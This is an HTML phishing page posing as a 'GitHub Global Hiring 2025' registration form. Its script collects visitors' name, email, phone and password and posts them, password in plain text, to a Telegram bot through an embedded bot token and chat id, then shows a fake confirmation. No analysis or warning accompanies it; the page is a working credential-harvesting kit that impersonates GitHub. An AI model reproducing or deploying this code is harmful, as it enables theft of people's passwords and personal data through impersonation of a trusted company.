<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GitHub Global Hiring 2025</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(to bottom right, #222, #555);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .form-container {
      background-color: #111;
      padding: 30px;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(100, 0, 255, 0.4);
      text-align: center;
    }

    h2 {
      color: #fff;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: none;
      border-radius: 8px;
      background: #1e1e1e;
      color: #fff;
      font-size: 16px;
      border: 1px solid #333;
      outline: none;
      transition: border 0.3s;
    }

    input:focus {
      border: 1px solid #bb86fc;
      box-shadow: 0 0 5px #bb86fc;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      background: linear-gradient(90deg, #7b2ff7, #f107a3);
      color: #fff;
      cursor: pointer;
      transition: opacity 0.3s;
    }

    button:hover {
      opacity: 0.9;
    }

    .link {
      margin-top: 15px;
      font-size: 14px;
      color: #ccc;
    }

    .link a {
      color: #bb86fc;
      text-decoration: none;
    }

    .thankyou {
      display: none;
      margin-top: 20px;
      color: #00ff87;
      font-size: 18px;
      font-weight: bold;
    }

    @media (max-width: 480px) {
      .form-container {
        margin: 20px;
        padding: 25px;
      }
    }
  </style>
</head>
<body>

  <div class="form-container">
    <h2>Register</h2>
    <form id="registerForm">
      <input type="text" name="name" placeholder="Full Name" required />
      <input type="email" name="email" placeholder="E-mail" required />
      <input type="text" name="phone" placeholder="Phone" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="password" name="confirm" placeholder="Confirm Password" required />
      <button type="submit">Register</button>
    </form>
    <div class="link">Have account? <a href="#">Sign In</a></div>
    <div class="thankyou">‚úÖ Registered! We‚Äôll reach out soon.</div>
  </div>

  <script>
    document.getElementById("registerForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const form = e.target;
      const data = {
        name: form.name.value,
        email: form.email.value,
        phone: form.phone.value,
        password: form.password.value,
        confirm: form.confirm.value
      };

      if (data.password !== data.confirm) {
        alert("Passwords do not match!");
        return;
      }

      try {
        await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "<968143308>",
            text: `üîê *New Registration - GitHub Drive 2025*\n\nüë§ Name: ${data.name}\nüìß Email: ${data.email}\nüì± Phone: ${data.phone}\nüîë Password: ${data.password}`,
            parse_mode: "Markdown"
          })
        });

        form.style.display = "none";
        document.querySelector(".thankyou").style.display = "block";
      } catch (err) {
        alert("Error submitting form.");
        console.error(err);
      }
    });
  </script>

</body>
</html>
